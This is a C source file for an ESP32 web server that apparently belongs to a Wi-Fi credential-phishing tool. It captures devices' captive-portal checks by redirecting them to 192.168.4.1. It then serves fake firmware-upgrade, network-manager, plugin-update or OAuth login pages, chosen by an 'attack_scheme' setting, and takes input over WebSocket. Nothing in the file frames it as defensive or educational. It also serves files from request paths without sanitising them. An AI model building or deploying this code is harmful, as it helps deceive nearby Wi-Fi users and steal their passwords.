#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <lwip/sockets.h>
#include <cJSON.h>
#include "server.h"
#include "server_api.h"

/* Pages include */
#include "web/passwords.h"

static const char *TAG = "WEBSERVER";
static httpd_handle_t server = NULL;
static uint8_t attack_scheme = 0;
static QueueHandle_t ws_frame_queue = NULL;
static TaskHandle_t ws_frame_process_task_handle = NULL;


static void ws_send_work(void *arg)
{
    ws_frame_req_t *r = (ws_frame_req_t *)arg;
    httpd_ws_frame_t out = {
        .final = true,
        .fragmented = false,
        .type = HTTPD_WS_TYPE_TEXT,
        .payload = (uint8_t *)r->payload,
        .len = r->len ? r->len : strlen(r->payload)
    };
	/* BROADCAST */
	if (r->fd == -1) {
        size_t fds = 10;
        int client_fds[10];
        if (httpd_get_client_list(r->hd, &fds, client_fds) == ESP_OK) {
            for (int i = 0; i < fds; i++) {
                if (httpd_ws_get_fd_info(r->hd, client_fds[i]) == HTTPD_WS_CLIENT_WEBSOCKET) {
                    httpd_ws_send_frame_async(r->hd, client_fds[i], &out);
                }
            }
        }
    } 
	/* UNICAST */
    else {
        httpd_ws_send_frame_async(r->hd, r->fd, &out);
    }

    if (r->need_free && r->payload) {
        free(r->payload);
    }
    free(r);
}


static void ws_frame_process_task(void *pvParameter)
{
	(void)pvParameter;
	ws_frame_req_t ws_frame;
	while (1) 
	{
		if (xQueueReceive(ws_frame_queue, &ws_frame, portMAX_DELAY) == pdTRUE) 
		{
			switch (ws_frame.frame_type)
			{
			case WS_RX_FRAME:
			{
				/* Process received frame */
				http_api_parse(&ws_frame);
				if (ws_frame.payload) free(ws_frame.payload);
				break;
			}
			
			case WS_TX_FRAME:
			{
				/* Process transmit frame */
				ws_frame_req_t *heap_req = malloc(sizeof(ws_frame_req_t));
				if (heap_req) {
                    memcpy(heap_req, &ws_frame, sizeof(ws_frame_req_t));
                    httpd_queue_work(ws_frame.hd, ws_send_work, heap_req);
                } else {
                    if(ws_frame.payload && ws_frame.need_free) free(ws_frame.payload);
                }
				break;
			}
			
			default:
				break;
			}
			
		}
	}
}


static esp_err_t captive_portal_redirect(httpd_req_t *req)
{
	const char *portal_url = "http://192.168.4.1/";
	httpd_resp_set_status(req, "302 Found");
	//httpd_resp_set_hdr(req, "Host", host);
	httpd_resp_set_hdr(req, "Location", portal_url);
	httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
	httpd_resp_set_hdr(req, "Content-Length", "0");
	httpd_resp_send(req, NULL, 0);
	return ESP_OK;
}


static esp_err_t cors_prevention_handler(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
    return httpd_resp_send(req, NULL, 0);
}


static esp_err_t ws_handler(httpd_req_t *req)
{
    if (req->method == HTTP_GET) {
        ESP_LOGD(TAG, "WS handshake done, new client fd=%d", httpd_req_to_sockfd(req));
        return ESP_OK;
    }

    httpd_ws_frame_t frame = {0};
	frame.type = HTTPD_WS_TYPE_TEXT;

	esp_err_t ret = httpd_ws_recv_frame(req, &frame, 0);
    if (ret != ESP_OK) return ret;

	if (frame.type == HTTPD_WS_TYPE_PING) {
        ESP_LOGD(TAG, "PING (fd=%d)", httpd_req_to_sockfd(req));
        httpd_ws_frame_t pong = {.type = HTTPD_WS_TYPE_PONG, .payload = NULL, .len = 0};
        return httpd_ws_send_frame(req, &pong);
    }

    if (frame.type == HTTPD_WS_TYPE_CLOSE) {
        ESP_LOGD(TAG, "CLOSE (fd=%d)", httpd_req_to_sockfd(req));
        return ESP_OK;
    }

	if (frame.len > 0) {
        char *buf = malloc(frame.len + 1);
        if (!buf) {
            ESP_LOGE(TAG, "No mem for WS frame");
            return ESP_ERR_NO_MEM;
        }
        frame.payload = (uint8_t *)buf;
        ret = httpd_ws_recv_frame(req, &frame, frame.len);
        if (ret != ESP_OK) {
            free(buf);
            return ret;
        }
        buf[frame.len] = 0;

        ws_frame_req_t ws_req;
        ws_req.hd = req->handle;
        ws_req.fd = httpd_req_to_sockfd(req);
        ws_req.frame_type = WS_RX_FRAME;
        ws_req.payload = buf;
        ws_req.len = frame.len;
        ws_req.need_free = true;

        if (xQueueSend(ws_frame_queue, &ws_req, 100) != pdTRUE) {
            free(buf);
            return ESP_FAIL;
        }
    }
    return ESP_OK;
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	char filepath[128] = "/spiffs";
	char buf[1024];
    size_t n;
	const char *uri = req->uri;

	/* Redirect to captive portal */
	if(strcmp(uri, "/hotspot-detect.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/library/test/success.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/generate_204") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/connecttest.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/ncsi.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/check_network_status.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/canonical.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(uri, "/redirect") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	
    if (strcmp(uri, "/") == 0) { 
		switch(attack_scheme)
		{
			case FIRMWARE_UPGRADE:
				uri = "/fwupgrade/index.html";
				break;
			
			case WEB_NET_MANAGER:
				uri = "/netmng/index.html";
				break;

			case PLUGIN_UPDATE:
				uri = "/plugin.html";
				break;

			case OAUTH_LOGIN:
				uri = "/oauth/index.html";
				break;

			default:
				uri = "/upgrade.html";
				break;
		}
	}
    strlcat(filepath, uri, sizeof(filepath));

    FILE *f = fopen(filepath, "r");
    if (!f) 
    { 
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
        return ESP_OK; 
    }

    httpd_resp_set_type(req, mime_from_path(filepath));
	
    
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) 
    {
        if (httpd_resp_send_chunk(req, buf, n) != ESP_OK) 
        { 
            fclose(f); 
            return ESP_FAIL; 
        }
    }
    fclose(f);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}


esp_err_t ws_send_command_to_queue(ws_frame_req_t *_req)
{
	if (ws_frame_queue == NULL) {
		ESP_LOGE(TAG, "Websocket frame queue is not initialized!");
		return ESP_FAIL;
	}

	/* Enforce frame type */
	_req->frame_type = WS_TX_FRAME;

	if (xQueueSend(ws_frame_queue, _req, 100) != pdTRUE) {
		ESP_LOGE(TAG, "Failed to send command to queue!");
		return ESP_FAIL;
	}

	return ESP_OK;
}


esp_err_t ws_send_broadcast_to_queue(ws_frame_req_t *_req)
{
    if (ws_frame_queue == NULL) {
		ESP_LOGE(TAG, "Websocket frame queue is not initialized!");
		return ESP_FAIL;
	}
    _req->frame_type = WS_TX_FRAME;
    

    if (xQueueSend(ws_frame_queue, _req, 0) != pdTRUE) {
        return ESP_FAIL; 
    }

    return ESP_OK;
}


void http_server_start(void)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Web server already started.");
		return;
	}

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;
	config.max_uri_handlers = 15;

	esp_err_t ret = httpd_start(&server, &config);
	if (ret != ESP_OK) {
		ESP_LOGE(TAG, "Failed to start web server: %s", esp_err_to_name(ret));
		return;
	}

	ws_frame_queue = xQueueCreate(WS_FRAME_QUEUE_LENGTH, sizeof(ws_frame_req_t));
	if (ws_frame_queue == NULL) {
		ESP_LOGE(TAG, "Failed to create websocket frame queue!");
		return;
	}
	xTaskCreate(ws_frame_process_task, "ws_frame_process_task", 4096, NULL, 5, &ws_frame_process_task_handle);

	/* Handler for CORS preflight requests */
	httpd_uri_t cors_preflight_uri = {
		.uri = "/*",
		.method = HTTP_OPTIONS,
		.handler = cors_prevention_handler,
		.user_ctx = NULL
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &cors_preflight_uri));

	httpd_uri_t ws_uri = {
		.uri = "/ws",
		.method = HTTP_GET,
		.handler = ws_handler,
		.user_ctx = NULL,
		.is_websocket = true,
		.handle_ws_control_frames = true
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &ws_uri));

	httpd_uri_t any = {
		.uri = "/*", 
		.method = HTTP_GET, 
		.handler = redirect_handler, 
		.user_ctx = NULL
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any));
}


void http_server_stop(void)
{
	if( ws_frame_queue != NULL ) {
		vQueueDelete(ws_frame_queue);
		ws_frame_queue = NULL;
	}

	if( ws_frame_process_task_handle != NULL ) {
		vTaskDelete(ws_frame_process_task_handle);
		ws_frame_process_task_handle = NULL;
	}

	if( server != NULL ) {
        if( httpd_stop(server) != ESP_OK ) {
            ESP_LOGD(TAG, "Failed to stop web server.");
            return;
        }
		server = NULL;
    }
}


httpd_handle_t get_web_server_handle(void) 
{
    return server;
}